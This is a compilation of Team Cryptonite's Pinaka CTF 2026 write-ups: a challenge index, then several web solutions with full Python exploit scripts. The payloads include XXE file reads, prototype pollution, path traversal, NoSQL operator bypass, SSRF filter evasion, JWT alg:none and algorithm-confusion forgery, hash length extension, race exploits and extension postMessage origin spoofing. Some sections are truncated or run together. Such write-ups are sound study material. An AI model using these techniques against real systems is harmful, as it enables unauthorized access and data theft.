title: Pinaka CTF 2026: all 44 write-ups by Team Cryptonite
excerpt: Every challenge Team Cryptonite wrote up from Pinaka CTF 2026, sorted by category: web, cryptography, reverse engineering, binary exploitation, forensics, misc and OSINT.
content:
Team Cryptonite played **[Pinaka CTF 2026](https://cyberhx.com/events/pinaka-ctf)**, the 24-hour national CTF hosted by NFSU Chennai with CyberHx, and wrote up 44 challenges across six categories. Every solve below has the full method, the scripts and the screenshots.

## Web (9)

- [Angada: The Unshaken Oath](https://cyberhx.com/blog/pinaka-angada-the-unshaken-oath-cryptonite): The chancery scribe clears every document in his own time. An oath, once sworn, is unshaken - but what may a faithful envoy carry?
- [Angada's Embassy](https://cyberhx.com/blog/pinaka-angadas-embassy-cryptonite): Angada planted his foot in Ravana's court and swore not to be moved. The court runs on signed oaths and sealed approvals, each one lawful on its own. Make their lawful agreement carry an unlawful decree.
- [Hanuman: The Unknown Messenger](https://cyberhx.com/blog/pinaka-hanuman-the-unknown-messenger-cryptonite): A vanara messenger relay speaks JSON. Probe its endpoints, reverse the delegation protocol, and escalate from an ordinary courier to royal authority to dispatch the war-writ.
- [Kakbhushundi: The 29th Universe](https://cyberhx.com/blog/pinaka-kakbhushundi-29th-universe-cryptonite): Beating every level, decoding the token the game hands back, and the step that opened the 29th universe.
- [Maya Mriga: The Golden Illusion](https://cyberhx.com/blog/pinaka-maya-mriga-the-golden-illusion-cryptonite): An event-sourced animal-custody service keeps an authoritative fold and a separate live projection. Exploit the replay-ordering gap between the two views to become the golden deer's holder.
- [Panchavati: The Fifth Boundary](https://cyberhx.com/blog/pinaka-panchavati-the-fifth-boundary-cryptonite): Chrome MV3 extension (Rekha Guard) protects a backend seal. From an attacker-controlled origin, confuse the Guard's boundary check so it lifts the seal for your page.
- [The Fourteen-Year Decree: Broken Time](https://cyberhx.com/blog/pinaka-the-fourteen-year-decree-broken-time-cryptonite): A sealed decree lies within the Vanvaas Chronicle. Read what was never meant for your eyes.
- [The Golden Deer](https://cyberhx.com/blog/pinaka-the-golden-deer-cryptonite): A golden deer flickers at the edge of the forest, too perfect to be real. Chase it through Ravana's web and you will find the illusion was a lure all along. Catch what was never meant to be caught.
- [Vibhishana: The Oath of Refuge](https://cyberhx.com/blog/pinaka-vibhishana-the-oath-of-refuge-cryptonite): An HTTP/JSON gateway implements a session-ticket / refuge-grant attestation flow. Exploit session-identity unbinding to elevate Vibhishana without a Council grant.

## Cryptography (6)

- [Janaka's Court: The False Witness](https://cyberhx.com/blog/pinaka-janakas-court-the-false-witness-cryptonite): Forge a 1-of-2 Schnorr OR-proof deposition for a forbidden docket. The Fiat-Shamir challenge omits the prover's commitments, so both OR branches can be simulated. Validator: https://pinaka-m02-cyber-xo-x.vercel.app/
- [Nala's Blueprint: The Secret Geometry](https://cyberhx.com/blog/pinaka-nalas-blueprint-the-secret-geometry-cryptonite): Recover corrupted Reed-Solomon symbols, verify pier measurements lie on a parabola, compute the keystone apex, then exploit AEAD nonce-reuse between the manifest and blueprint ciphertexts to break the seal.…
- [Sugriva's Covenant: The Divided Oath](https://cyberhx.com/blog/pinaka-sugrivas-covenant-the-divided-oath-cryptonite): No lone captain commands the host. The covenant demands a quorum - but the ledger is damaged and the oath-seals are scattered across revisions. Validator: https://pinaka-k02-cyber-xo-x.vercel.app/
- [The Last Astra: An Unprovable Command](https://cyberhx.com/blog/pinaka-the-last-astra-an-unprovable-command-cryptonite): Two seals guard the forbidden order. Both must accept before the Astra fires. The sages were certain no single command could deceive them both. Validator: https://pinaka-l05-cyber-xo-x.vercel.app/
- [Vaidehi: The Sealed Covenant](https://cyberhx.com/blog/pinaka-vaidehi-the-sealed-covenant-cryptonite): Forge a 3-of-3 MuSig Schnorr council seal for a forbidden revision. The signing session reuses nonces across revisions; two genuine seals yield the aggregate private key via nonce-reuse extraction. Validator:…
- [Vishvamitra: The Broken Invocation](https://cyberhx.com/blog/pinaka-vishvamitra-the-broken-invocation-cryptonite): Exploit a flaw in a Fiat-Shamir non-interactive ZK grant-proof protocol. Forge a valid proof for the forbidden Brahmastra using only public parameters and a leaked lesser-boon grant. Validator:…

## Reverse engineering (8)

- [Ahalya: The Petrified Memory](https://cyberhx.com/blog/pinaka-ahalya-the-petrified-memory-cryptonite): Given a raw NVM image, a damaged write-ahead log and a logical-to-physical map checkpoint, recover the last committed version of a sealed record and attest to the whole archive. The record is logical id 3155.
- [Bala & Atibala: The Forgotten State](https://cyberhx.com/blog/pinaka-bala-and-atibala-the-forgotten-state-cryptonite): The warden attests one record and then honours a different record that flattens to the same bytes. The goal is to get an "elevated" record (mantra=atibala, tier>=7) accepted using the attestation of a harmless one.
- [Dhanurbhanga: The Fractured Invariant](https://cyberhx.com/blog/pinaka-dhanurbhanga-the-fractured-invariant-cryptonite): Produce a well-formed Pinaka Tension Machine (PTM) program whose final register equals TARGET = 3205865151537252764. A formal proof says that's impossible over unbounded integers, but the real checker does its…
- [Gurukul: The Silent Instruction](https://cyberhx.com/blog/pinaka-gurukul-the-silent-instruction-cryptonite): The gate wants an eight-byte "mantra" and a trace tag. The firmware checks each mantra byte with one linear equation mod 251, so the mantra can be solved directly and the real emulator supplies the tag.
- [Jambavan: The Forgotten Strength](https://cyberhx.com/blog/pinaka-jambavan-the-forgotten-strength-cryptonite): jambavanseal is an oracle that reads 0/1 characters from stdin. The goal is a 128-bit "chant" that drives its hidden state to a target sigil.
- [Kumbhakarna: The Machine Beneath Lanka](https://cyberhx.com/blog/pinaka-kumbhakarna-awakens-cryptonite): kumbha is a stripped x86-64 binary that turns out to be a tiny 24-bit virtual machine with its ROM embedded in the ELF. The validator wants four 24-bit input words (the "invocation") and the resulting TAG. Rather…
- [Kumbhakarna: The Sleepless Curse](https://cyberhx.com/blog/pinaka-kumbhakarna-the-sleepless-curse-cryptonite): The gate (POST /lanka/awaken) wants a six-word summons and a 64-hex attestation:
- [Pinaka: The Impossible Bow](https://cyberhx.com/blog/pinaka-pinaka-the-impossible-bow-cryptonite): pinakabow is a custom VM host with a 1M-instruction program embedded in it. The validator wants a 24-byte "draw" as 48 hex chars. The decoding is state-dependent and the control flow is flattened, but the program…

## Binary exploitation (4)

- [Lankadahana: Trial by Agni](https://cyberhx.com/blog/pinaka-lankadahana-trial-by-agni-cryptonite): Hanuman's tail was set alight, so he set all of Lanka ablaze. The city's memory burns in a machine that trusts its own ashes. Light the first spark and let the fire spread.

Exploit generation-tag wraparound causing a UAF via cross-thread recycling to gain code execution and consecrate the bridge.
- [Siddhashrama: The Unbroken Vigil](https://cyberhx.com/blog/pinaka-siddhashrama-the-unbroken-vigil-cryptonite): Reverse a stripped concurrent daemon with a custom slab allocator. Find the deterministic UAF seam in ward hand-off/renewal, craft a memory primitive, and complete the restricted proof.

The CPU faithfully executes your programs but enforces strict bounds on every access. The arrow that found Vali struck through the trees unseen - find the…

title: Angada's Embassy
excerpt: Angada planted his foot in Ravana's court and swore not to be moved. The court runs on signed oaths and sealed approvals, each one lawful on its own. Make their lawful agreement carry an unlawful decree.
content:
**[Pinaka CTF 2026](https://cyberhx.com/events/pinaka-ctf)** · Web · Team Cryptonite · [All 44 Pinaka write-ups](https://cyberhx.com/blog/pinaka-ctf-2026-team-cryptonite-writeups)

---

>Angada planted his foot in Ravana's court and swore not to be moved. The court runs on signed oaths and sealed approvals, each one lawful on its own. Make their lawful agreement carry an unlawful decree.

## Solve
- `/dispatch` authorizes off the approval's stored snapshot from when `tick` approved it, but then sends whatever the doc's live `current_rev` actually resolves to.
- `ratify` is the only thing that touch `current_rev`. It lets you set `source_doc_id`/`source_rev_id` to basically anything,
- first i created session and my own document
- then i had to self delegate `dispatch`, so signature becomes valid
- submit for approval
- opened court, tabled the doc and `doc_sealed_reply` together.
- called ratify on doc, referenced it to `doc_sealed_reply`'s sealed revision
- called dispatch, auth check passes off the stale snapshot, but it sends the sealed rev.
- heres script:
```python
#!/usr/bin/env python3
import json, urllib.request, urllib.error

BASE = "https://pinaka-angada-embassy.onrender.com"

def call(method, path, body=None, sid=None, token=None):
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(BASE + path, data=data, method=method)
    req.add_header("Content-Type", "application/json")
    if sid: req.add_header("X-Session", sid)
    if token: req.add_header("Authorization", "Bearer " + token)
    try:
        with urllib.request.urlopen(req, timeout=30) as r:
            return r.status, json.loads(r.read().decode())
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()


_, r = call("POST", "/portal/session")
sid, tok = r["session_id"], r["token"]

_, r = call("POST", "/documents", {"subject": "rama", "content": "benign"}, sid, tok)
doc, rev = r["doc_id"], r["current_rev"]

call("POST", "/delegation/delegations", {"doc_id": doc, "delegate": "angada", "permission": "dispatch"}, sid, tok)
call("POST", "/approvals", {"doc_id": doc, "rev_id": rev}, sid, tok)
call("POST", "/approvals/tick", {}, sid, tok)

_, r = call("POST", "/dispatch/sessions", {"name": "audience"}, sid, tok)
court = r["court_id"]

call("POST", f"/documents/{doc}/table", {"court_id": court}, sid, tok)
call("POST", "/documents/doc_sealed_reply/table", {"court_id": court}, sid, tok)
call("POST", f"/documents/{doc}/ratify", {"source_doc_id": "doc_sealed_reply", "source_rev_id": "rev_sealed", "court_id": court}, sid, tok)

_, r = call("POST", "/dispatch", {"doc_id": doc, "court_id": court}, sid, tok)
print(r)

```
Output:
![Angada's Embassy: step screenshot](https://cyberhx.com/writeups/cryptonite/web/agnadaem1.webp)
## Flag:
`PINAKA{the_seal_breaks_where_legitimate_workflows_cross}`

excerpt: The chancery scribe clears every document in his own time. An oath, once sworn, is unshaken - but what may a faithful envoy carry?

>The chancery scribe clears every document in his own time. An oath, once sworn, is unshaken - but what may a faithful envoy carry? Connection: [http://130.210.48.10:9011/](http://130.210.48.10:9011/ "http://130.210.48.10:9011/")

## Solve:
- I read the README provided to understand whats happening in the chall.
![Angada: The Unshaken Oath: step screenshot](https://cyberhx.com/writeups/cryptonite/web/angada2.webp)
- To send a POST to `/chancery/enroll`, you need a `X-Session-Id` header
![Angada: The Unshaken Oath: step screenshot](https://cyberhx.com/writeups/cryptonite/web/angada4.webp)
- Ok, now with the session id `sess_cfa8b7b0`, 
```bash
{
    "head": "r_001",
    "id": "doc_war_terms",
    "owner": "vibhishana",
    "revisions": {
        "r_001": {
            "cls": "sealed",
            "content": null,
            "note": "war-council terms",
            "redacted": true
        }
    },
    "subject": "rama"
}
{
    "delegations": [
        {
            "clearance": "normal",
            "delegate": "angada",
            "delegator": "herald",
            "doc": "doc_war_terms",
            "id": "deleg_8af6ce0b",
            "permission": "dispatch",
            "sig": "30d7ab1300913ca221508e8be8dd0334"
        },
        {
            "clearance": "normal",
            "delegate": "angada",
            "delegator": "herald",
            "doc": "doc_war_terms",
            "id": "deleg_a4fb9f12",
            "permission": "revise",
            "sig": "bd9f9ddbc74f99e3ca9357f9f7287f5a"
        }
    ]
}
```
- But when i tried reading the doc, it still showed me an error,
`{"error":"the current revision is not cleared for dispatch"}`
- then I figured out that the document immediately needed to rollback on `r_001` because that is where the flag is. it was essentially a race condition.
```bash
{"doc_id":"doc_war_terms","note":"the scribe commits a certificate after deliberation","queue_position":1,"queued":true,"rev_id":"r_002"}
```
- If I try to read the document now,
```bash
{
    "audit": [
        {
            "action": "author",
            "actor": "vibhishana",
            "cls": "sealed",
            "doc": "doc_war_terms",
            "rev": "r_001",
            "t": 0.0
        },
        {
            "action": "revise",
            "actor": "angada",
            "cls": "normal",
            "doc": "doc_war_terms",
            "rev": "r_002",
            "t": 254.249
        },
        {
            "action": "submit_review",
            "actor": "angada",
            "doc": "doc_war_terms",
            "rev": "r_002",
            "t": 269.103
        },
        {
            "action": "rollback",
            "actor": "angada",
            "doc": "doc_war_terms",
            "rev": "r_001",
            "t": 269.196
        },
        {
            "action": "certify",
            "actor": "scribe-worker",
            "doc": "doc_war_terms",
            "rev": "r_001",
            "t": 269.715,
            "verdict": "cleared"
        }
    ]
}
{"dispatched":true,"doc_id":"doc_war_terms","response":"PINAKA{angada_the_unshaken_oath}","rev_id":"r_001","subject":"rama"}
```
- In the response, I got the flag.

`PINAKA{angada_the_unshaken_oath}`

title: Hanuman: The Unknown Messenger
excerpt: A vanara messenger relay speaks JSON. Probe its endpoints, reverse the delegation protocol, and escalate from an ordinary courier to royal authority to dispatch the war-writ.
content:
**[Pinaka CTF 2026](https://cyberhx.com/events/pinaka-ctf)** · Web · Team Cryptonite · [All 44 Pinaka write-ups](https://cyberhx.com/blog/pinaka-ctf-2026-team-cryptonite-writeups)

---

>A vanara messenger relay speaks JSON. Probe its endpoints, reverse the delegation protocol, and escalate from an ordinary courier to royal authority to dispatch the war-writ. Connection: [http://130.210.48.10:9006/](http://130.210.48.10:9006/ "http://130.210.48.10:9006/")
## Solve:
- These are the endpoints we had:
	- `/court/principals` -> exposed roster (names + ranks)
	- `/court/open` -> open a relay session (returns token, session_key, self-grant)
	- /court/session -> inspect current session state
	- /court/reseal -> re declare the principal relay carries
	- /court/dispatch -> dispatch a sealed scroll
- in `court/principals`, the roster only showed `sugriva` as royal, whereas everyone else was `duta`
- session auth was `Authorization: Duta <session_token>`, i found this by bruting header/query/cookie shapes
- `/court/reseal` lets you set `on_behalf` to literally anything without verification,  so we had to somehow declare `on_behalf: sugriva`
- `/court/dispatch` checks three things in order -
	- if seal = base64url(HMAC-SHA256(session_key, sid + "|" + sha256(scroll).hex))
	- signed grant
	- authority of real (should be royal)
- So I had to open a session, then reseal on_behalf=sugriva, seal the scroll and then dispatch with own guild grant
- Script:
![Hanuman: The Unknown Messenger: step screenshot](https://cyberhx.com/writeups/cryptonite/web/k01.webp)
- With this, i got the flag:
```
"flag": "PINAKA{kishkindha_the_exile_meets_the_outcast_king}"
```

## Flag:
`PINAKA{kishkindha_the_exile_meets_the_outcast_king}`

```

- now this became a web challenge :(
- these are the endpoints we had:
	- `/api/universe` -> shrine map and final gate requirements
	- `/api/katha` -> Tataka, hidden pilgrim IDOR
	- `/api/homa` -> Subahu, XML oblation
	- `/api/maya` -> Maricha, JSON vessel merge
	- `/api/patra` -> Viradha, scroll reader
	- `/api/dwar` -> Khara, gate roster
	- `/api/bhuja` -> Kabandha, URL fetcher
	- `/api/mudra` -> Akshayakumara, JWT gate
	- `/api/parvat` -> Kumbhakarna, JWT gate
	- `/api/kavach` -> Meghnad, MAC-protected message
	- `/api/darshan` -> returns an RS256-signed darshan JWT
	- `/api/garbha` -> hidden inner sanctum, requires `X-Antar-Yatra` header
	- `/api/flag` -> final gate, accepts `{token, khandas}`
- `/api/universe` showed the gate requires `brahmand = "swarna-lanka"`, `drishti = "kakbhushundi"`, and all 9 khandas.
- khanda 1 (`/api/katha`): the list showed pilgrims `1..10`, but the swallowed one is `id=0`:
	- `GET /api/katha?id=0` -> `9dd32532e232`
- khanda 2 (`/api/homa`): XXE in the XML oblation:
	- `<!DOCTYPE yagna [<!ENTITY xxe SYSTEM "file:///agni-khanda.scroll">]><yagna><oblation>&xxe;</oblation></yagna>`
	- `POST /api/homa` with `Content-Type: application/xml` -> `2a486756ef52`
- khanda 3 (`/api/maya`): prototype pollution:
	- `POST /api/maya` with `{"__proto__":{"darshan":"rishi"}}` -> `2aa95abc0363`
- khanda 4 (`/api/patra`): path traversal. The visible grove is `scrolls/public` with `dandaka.scroll` and `viradha.scroll`; one level up is `scrolls/`, which has a `sealed/` directory. The khanda file follows the same elemental naming as `agni-khanda.scroll`, so Viradha's earth-themed file is `prithvi-khanda.scroll`:
	- `GET /api/patra?scroll=../sealed/prithvi-khanda.scroll` (URL-encoded: `..%2Fsealed%2Fprithvi-khanda.scroll`) -> `89555a4458ab`
- khanda 5 (`/api/dwar`): loose comparison / type juggling. The gate only validates the name, and the passphrase check is bypassed with a condition object:
	- `POST /api/dwar` with `{"naam":"dwarpal","mudra":{"$ne":null}}` -> `eb072559af0c`
	- (Omitting `mudra` entirely also passed during testing.)
- khanda 6 (`/api/bhuja`): SSRF plus a hidden route. Pointing `reach` at `https://httpbin.org/headers` leaked the temple header `X-Antar-Yatra: antar-yatra-1548d6d432`. The inner sanctum is `/api/garbha`, but the arm refuses to fetch a URL containing the literal word `garbha`, so percent-encode the `g`:
	- `GET /api/bhuja?reach=https://<api-host>/api/%67arbha` -> `body.khanda` = `1fc356c2c1ef`
- khanda 7 (`/api/mudra`): JWT `alg:none`. Forge:
	- header `{"alg":"none","typ":"JWT"}`, payload `{"rank":"senapati"}`, empty signature
	- `POST /api/mudra` with `{"token":"..."}` -> `cc143a62233e`
- khanda 8 (`/api/parvat`): HS256 with a weak secret. The hint "five-letter island" gives `lanka`. Verify the issued token's HMAC with `lanka`, then forge:
	- payload `{"rank":"deva","woke":true}`
	- `POST /api/parvat` -> `c5655016d2f2`
- khanda 9 (`/api/kavach`): SHA-256 length extension. The amulet computes `SHA256(secret || message)` with a 15-byte secret:
	- known message: `bhakt=kush&rank=manushya`
	- append `&rank=trikaldarshi` with the SHA-256 padding for `15 + len(message)` bytes, continue the hash state from the known digest, submit the new base64 message and MAC
	- `POST /api/kavach` -> `475b91ac0d1a`
- The final gate is an RS256 public-key recovery + algorithm-confusion attack:
	- i had to do`GET /api/darshan` twice to get two RS256 tokens under the same key.
	- for each token, i computed the PKCS#1 v1.5 encoded digest `m_i = 00 01 FF... 00 || DigestInfo(SHA256(header.payload))` padded to 256 bytes.
	- then i recovered the modulus `n = gcd(s1^65537 - m1, s2^65537 - m2)`. The result is a 2048-bit RSA modulus.
	- build the RSA public key `(n, 65537)` and export it as a SubjectPublicKeyInfo PEM.
	- the verifier trusts the token's `alg` and accepts HS256 while using the PEM public key as the HMAC secret. Forge an HS256 token with claims copied from a real darshan plus `brahmand = "swarna-lanka"`, `drishti = "kakbhushundi"`.
	- `POST /api/flag` with the forged token and all nine khandas.
- Script:
```python
#!/usr/bin/env python3
import base64
import hashlib
import hmac
import json
import sys
from pathlib import Path

import gmpy2
import requests
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa

sys.path.insert(0, str(Path(__file__).parent))
import hlextend

BASE = "https://kush-astra-yuddha.vercel.app/api/"
S = requests.Session()


def b64(data):
    return base64.urlsafe_b64encode(data).decode().rstrip("=")


def unb64(data):
    return base64.urlsafe_b64decode(data + "=" * (-len(data) % 4))


def get(path, **kwargs):
    r = S.get(BASE + path, timeout=15, **kwargs)
    r.raise_for_status()
    return r.json()


def post(path, **kwargs):
    r = S.post(BASE + path, timeout=15, **kwargs)
    r.raise_for_status()
    return r.json()


def rsa_public_key():
    differences = []
    for _ in range(2):
        header, payload, signature = get("darshan")["token"].split(".")
        sig = unb64(signature)
        digest = hashlib.sha256((header + "." + payload).encode()).digest()
        digest_info = bytes.fromhex("3031300d060960864801650304020105000420") + digest
        encoded = (
            b"\x00\x01"
            + b"\xff" * (len(sig) - len(digest_info) - 3)
            + b"\x00"
            + digest_info
        )
        differences.append(
            gmpy2.mpz(int.from_bytes(sig, "big")) ** 65537
            - int.from_bytes(encoded, "big")
        )
    n = int(gmpy2.gcd(*differences))
    assert n.bit_length() == 2048, "Unexpected modulus; retry with fresh darshans"
    return rsa.RSAPublicNumbers(65537, n).public_key()


def main():
    khandas = [None] * 9

    khandas[0] = get("katha", params={"id": 0})["khanda"]

    xml = (
        '<!DOCTYPE yagna [<!ENTITY xxe SYSTEM "file:///agni-khanda.scroll">]>'
        "<yagna><oblation>&xxe;</oblation></yagna>"
    )
    khandas[1] = post(
        "homa", data=xml, headers={"Content-Type": "application/xml"}
    )["consumed"]

    khandas[2] = post("maya", json={"__proto__": {"darshan": "rishi"}})["khanda"]

    khandas[3] = get(
        "patra", params={"scroll": "../sealed/prithvi-khanda.scroll"}
    )["khanda"]

    khandas[4] = post(
        "dwar", json={"naam": "dwarpal", "mudra": {"$ne": None}}
    )["khanda"]

    reach = "https://kush-astra-yuddha.vercel.app/api/%67arbha"
    khandas[5] = get("bhuja", params={"reach": reach})["body"]["khanda"]

    unsigned = (
        b64(b'{"alg":"none","typ":"JWT"}')
        + "."
        + b64(b'{"rank":"senapati"}')
        + "."
    )
    khandas[6] = post("mudra", json={"token": unsigned})["khanda"]

    header, payload, signature = get("parvat")["token"].split(".")
    assert (
        b64(hmac.new(b"lanka", (header + "." + payload).encode(), hashlib.sha256).digest())
        == signature
    )
    body = b64(b'{"rank":"deva","woke":true}')
    signing_input = header + "." + body
    forged = (
        signing_input
        + "."
        + b64(hmac.new(b"lanka", signing_input.encode(), hashlib.sha256).digest())
    )
    khandas[7] = post("parvat", json={"token": forged})["khanda"]

    amulet = get("kavach")
    sha = hlextend.new("sha256")
    extended = sha.extend(
        b"&rank=trikaldarshi",
        unb64(amulet["message_b64"]),
        amulet["keyLength"],
        amulet["mac"],
    )
    khandas[8] = post(
        "kavach",
        json={
            "message_b64": base64.b64encode(extended).decode(),
            "mac": sha.hexdigest(),
        },
    )["khanda"]

    public_key = rsa_public_key()
    pem = public_key.public_bytes(
        serialization.Encoding.PEM,
        serialization.PublicFormat.SubjectPublicKeyInfo,
    )

    original = get("darshan")["token"]
    claims = json.loads(unb64(original.split(".")[1]))
    claims.update(brahmand="swarna-lanka", drishti="kakbhushundi")

    header = b64(b'{"alg":"HS256","typ":"JWT"}')
    payload = b64(json.dumps(claims, separators=(",", ":")).encode())
    signing_input = header + "." + payload
    token = (
        signing_input
        + "."
        + b64(hmac.new(pem, signing_input.encode(), hashlib.sha256).digest())
    )

    result = post("flag", json={"token": token, "khandas": khandas})
    print(result["flag"])


if __name__ == "__main__":
    main()
```

title: Maya Mriga: The Golden Illusion
excerpt: An event-sourced animal-custody service keeps an authoritative fold and a separate live projection. Exploit the replay-ordering gap between the two views to become the golden deer's holder.
content:
**[Pinaka CTF 2026](https://cyberhx.com/events/pinaka-ctf)** · Web · Team Cryptonite · [All 44 Pinaka write-ups](https://cyberhx.com/blog/pinaka-ctf-2026-team-cryptonite-writeups)

---

>An event-sourced animal-custody service keeps an authoritative fold and a separate live projection. Exploit the replay-ordering gap between the two views to become the golden deer's holder. Connection: [http://130.210.48.10:9005/](http://130.210.48.10:9005/ "http://130.210.48.10:9005/")
- Endpoints we had:
    - `/ranger/enroll` -> get a token (ranger id is encoded inside it)
    - `/forest/log` -> GET, full event log (claims/releases with `eid`, `type`, `ranger`)
    - `/track/claim` -> submit a claim event
    - `/projection/sync` -> POST an `order` (has to be a full permutation of event ids), returns `board_holder`
    - `/capture` -> the protected op, only works if you're the current holder
![Maya Mriga: The Golden Illusion: step screenshot](https://cyberhx.com/writeups/cryptonite/web/v04.webp)
- order has to be a permutation of every event id in the log, so we pulled the log and started poking at what fold function `sync` actually uses to turn an order into a holder
- i have my claim event e_48908d71ba (ranger-e17098) 
- The sync returned a different delivery order than I submitted, and holder is some third ranger.
- the board length differs every instance and every instance is a shared instance    
- the fold is a simple stack. claim pushes, release pops, holder = top of stack, so if my claim is the last event in the delivery order, i'm on top.
-  the server appends events committed after my log-snapshot to the end of my submitted order (in seq order), which pushes my claim off the top, this is a race, the tightest win, fetch log, then claim, then immediately sync, then capture.
- script:
```python
import urllib.request, json, base64
B="http://130.210.48.10:9005"
def call(path, body=None, method="POST"):
    data=json.dumps(body).encode() if body is not None else None
    req=urllib.request.Request(B+path, data=data, method=method,
        headers={"Content-Type":"application/json"})
    try:
        with urllib.request.urlopen(req, timeout=25) as r:
            return r.getcode(), json.loads(r.read())
    except urllib.error.HTTPError as e:
        try: return e.code, json.loads(e.read())
        except: return e.code, None

tok=call("/ranger/enroll")[1]["token"]
myranger=json.loads(base64.urlsafe_b64decode(tok.split(".")[0]+"=="))["ranger"]
print("me:",myranger)

for i in range(150):
    _,log=call("/forest/log",{"token":tok},"GET")
    eids=[e["eid"] for e in log["events"]]
    _,c=call("/track/claim",{"token":tok})
    myeid=c["event"]["eid"]
    order=[x for x in eids if x!=myeid]
    code,s=call("/projection/sync",{"token":tok,"order":order})
    bh=s.get("board_holder") if isinstance(s,dict) else None
    _,cap=call("/capture",{"token":tok})
    won=isinstance(cap,dict) and cap.get("captured")
    if bh==myranger or won or i%10==0:
        print(i,"board=",bh,"cap=",cap)
    if won:
        print("FLAG:",json.dumps(cap)); break
```
- After winning the race, the `capture` response came back with `captured: true` and the flag.

title: Panchavati: The Fifth Boundary
excerpt: Chrome MV3 extension (Rekha Guard) protects a backend seal. From an attacker-controlled origin, confuse the Guard's boundary check so it lifts the seal for your page.
content:
**[Pinaka CTF 2026](https://cyberhx.com/events/pinaka-ctf)** · Web · Team Cryptonite · [All 44 Pinaka write-ups](https://cyberhx.com/blog/pinaka-ctf-2026-team-cryptonite-writeups) --- >Chrome MV3 extension (Rekha Guard) protects a backend seal. From an attacker-controlled origin, confuse the Guard's boundary check so it lifts the seal for your page. Connection: [http://130.210.48.10:9004/](http://130.210.48.10:9004/ "http://130.210.48.10:9004/") ## Solve: - The setup: - `GET /app` -> genuine app page - `POST /rekha/ward` -> issues the extension's `wardToken`, tied to victim's session - `GET /rekha/status` -> ward introspection, no secrets - `POST /rekha/release` -> header `X-Rekha-Ward: ` -> lifts the seal and should return flag - the extension has `background.js` + `content.js`, both with multiple message handlers. - Two of the handlers do origin checks, `_validateRefreshGrant` in background.js check `sender.origin !== _T`, and `_handleRefreshGrant` in content.js checks `ev.origin !== _T` ![Panchavati: The Fifth Boundary: step screenshot](https://cyberhx.com/writeups/cryptonite/web/v03-1.webp) - but the `release` path in both files checks the wrong thing: - content.js: `const gateOrigin = data.origin; if (gateOrigin !== _T) return;` `data.origin` is just a field in the postMessage payload, we can control it - background.js: checks `message.origin !== _T`, it's in the message body not the sender metadata - the only "real" check left is `_verifyFramePolicy`, which just verifies the tab is HTTPS ![Panchavati: The Fifth Boundary: step screenshot](https://cyberhx.com/writeups/cryptonite/web/v03-2.webp) - Since content.js matches ``, it's injected into any page . so from an attacker HTTPS page we just `postMessage` claiming `origin: 'https://panchavati.app'` - content.js checks the lie, not `ev.origin`, and relays to the background worker, which also checks the lie and passes `_verifyFramePolicy` - Background worker then attaches the real stored `wardToken` to `POST /rekha/release` and posts the response back to our page via `release-result`. - to claim to be panchavati ```html 


```

title: The Golden Deer
excerpt: A golden deer flickers at the edge of the forest, too perfect to be real. Chase it through Ravana's web and you will find the illusion was a lure all along. Catch what was never meant to be caught.
content:
**[Pinaka CTF 2026](https://cyberhx.com/events/pinaka-ctf)** · Web · Team Cryptonite · [All 44 Pinaka write-ups](https://cyberhx.com/blog/pinaka-ctf-2026-team-cryptonite-writeups)

---

>A golden deer flickers at the edge of the forest, too perfect to be real. Chase it through Ravana's web and you will find the illusion was a lure all along. Catch what was never meant to be caught. Connection: [https://pinaka-golden-deer.onrender.com/](https://pinaka-golden-deer.onrender.com/ "https://pinaka-golden-deer.onrender.com/") (log in with ranger / jatayu-watch; client ./mayanet-cli)
## Solve:
- These are the endpoints we had:
	- `/api/login` -> authenticate and get an `X-Session` token
	- `/api/update` -> submit telemetry events 
	- `/api/projection` -> read model ordered by `(ts, retry)`
	- `/api/authoritative` -> read model ordered by `seq`
	- `/api/proof` -> returns a `proof_token` only when the two read models diverge
	- `/api/events/raw` -> paginated raw event dump
	- `/api/validate` -> submit `{proof_token, deer_id, sequence}`
- the cli auth header was `X-Session: <token>` which i discovered from the client source
- in `capture-24h.jsonl` there were 9 deer ids nd 8 of them had ~6200 events each with random `prev_sig`/`sig` and zero hash links
- `deer-d51269dc11cc` was the only deer with a real `prev_sig -> sig` chain. It had 396 events, but only 256 formed the genuine chain starting from the zero-hash genesis:
![The Golden Deer: step screenshot](https://cyberhx.com/writeups/cryptonite/web/goldendeer1.webp)
- Following `sig -> prev_sig` from that genesis yielded exactly 256  events.  remaining 140 events were decoys with unrelated `prev_sig` values. and all events had `retry = 0`
- The trail is simply the ordered coordinates:
```python
trail = [[e["x"], e["y"]] for e in chain]
```
- To get a `proof_token`, the two read models had to disagree. `/api/projection` orders by `(ts, retry)` while `/api/authoritative` orders by `seq`, so I submitted:
```
	update seq=1 ts=1700000000001 x=10 y=20
	update seq=0 ts=1700000000002 x=99 y=99
```
- intended logic should reject when `token.deer_id != body.deer_id`, but instead any session with a divergence can validate any deer
- what i did was open a session, create divergence, get our own `training-deer` proof token, then validate `deer-d51269dc11cc` with that token and the 256-event trail
- Script:
```python
import json, collections, urllib.request

BASE = "https://pinaka-golden-deer.onrender.com"

def call(path, token=None, body=None):
	data = json.dumps(body).encode() 
	req = urllib.request.Request(BASE + path, data=data, method="POST")
	req.add_header("Content-Type", "application/json")
	if token:
		req.add_header("X-Session", token)
	with urllib.request.urlopen(req) as r:
		return json.loads(r.read())

tok = call("/api/login", body={"username": "ranger", "password": "jatayu-watch"})["token"]

call("/api/update", tok, {"seq": 1, "ts": 1700000000001, "retry": 0, "x": 10, "y": 20})
call("/api/update", tok, {"seq": 0, "ts": 1700000000002, "retry": 0, "x": 99, "y": 99})
proof = call("/api/proof", tok)["proof_token"]

events = collections.defaultdict(list)
for line in open("capture-24h.jsonl"):
	if line.strip():
		e = json.loads(line)
		events[e["deer_id"]].append(e)

chain = None
for deer, evs in events.items():
	genesis = [e for e in evs if e["prev_sig"] == "0" * 64]
	if not genesis:
		continue
	by_prev = collections.defaultdict(list)
	for e in evs:
		by_prev[e["prev_sig"]].append(e)

	cur, seen, walk = genesis[0]["sig"], {genesis[0]["sig"]}, [genesis[0]]
	while True:
		nxt = [e for e in by_prev.get(cur, []) if e["sig"] not in seen]
		if not nxt:
			break
		e = nxt[0]; walk.append(e); seen.add(e["sig"]); cur = e["sig"]

	if len(walk) > 1:
		chain = walk
		print(f"[+] {deer}: real chain length {len(walk)}")

trail = [[e["x"], e["y"]] for e in chain]
print("[+] trail events:", len(trail), trail[:3], "...", trail[-3:])

print(call("/api/validate", tok, {
	"proof_token": proof,
	"deer_id": "deer-d51269dc11cc",
